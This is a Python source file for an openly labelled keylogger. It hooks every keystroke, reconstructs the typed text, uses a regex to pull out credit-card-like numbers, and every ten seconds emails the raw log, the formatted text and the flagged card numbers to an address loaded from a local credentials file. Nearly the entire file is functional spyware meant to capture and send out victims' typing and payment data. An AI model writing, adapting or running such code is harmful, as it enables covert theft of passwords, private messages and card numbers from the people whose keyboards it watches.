import keyboard
import time
from emailer import Emailer
import json
import re

CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")

class Keylogger:
    def __init__(self, email: str, password: str) -> None:
        self.email = email
        self.password = password
        # Local data to use in the email
        self.local_buffer = ""
        self.local_buffer_raw = ""
        self.shift_keys = 0
        self.special_keys = {'space': ' ', 'shift': '', 'right shift': '', 'enter': '\\n'}

    def __handle_key_press(self, event):
        # On key down, add the key to the local buffer
        if event.event_type == "down":
            self.local_buffer_raw += event.name
            
            if event.name in self.special_keys:
                self.local_buffer += self.special_keys[event.name]
            else:
                self.local_buffer += event.name.capitalize() if self.shift_keys else event.name

            if event.name == "shift" or event.name ==  'right shift':
                self.shift_keys += 1

        elif event.event_type == "up":
            if event.name == "shift" or event.name ==  'right shift':
                self.shift_keys -= 1
            
    def __get_credit_card_info(self, buffer: str) -> dict:
        credit_card_info = [{"creditCardNumbers": re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)}]
        
        return credit_card_info

    def __flag_data(self, buffer: str) -> dict:
        # Check email with regex
        # Check digits
        formatted_local_buffer = {"loginInfo": [], "creditCardInfo": self.__get_credit_card_info(buffer)}

        return formatted_local_buffer

    def __email_local_buffer(self, emailer: Emailer) -> bool:
        
        # Flag stuff
        flagged_objects = self.__flag_data(self.local_buffer)

        data = {"raw": self.local_buffer_raw, 'formatted': self.local_buffer, "flagged": flagged_objects}

        try:
            emailer.send_email("Keylogger Info", json.dumps(data))
            print("Email sent successfully")
            return True
        except Exception as e:
            print(e)
            return False
        finally:
            # Reset the local buffer
            self.local_buffer = ""
            self.local_buffer_raw = ""
            print("Reset local buffer")

    

    def run(self) -> None:
        keyboard.hook(self.__handle_key_press)

        emailer = Emailer(self.email, self.password)
        while True:
            time.sleep(10)
            self.__email_local_buffer(emailer)

if __name__ == "__main__":
    with open("./email_info.json", 'r') as email_file:
        email_info = json.load(email_file)

    k = Keylogger(email_info["email"], email_info["applicationPassword"])
    k.run()
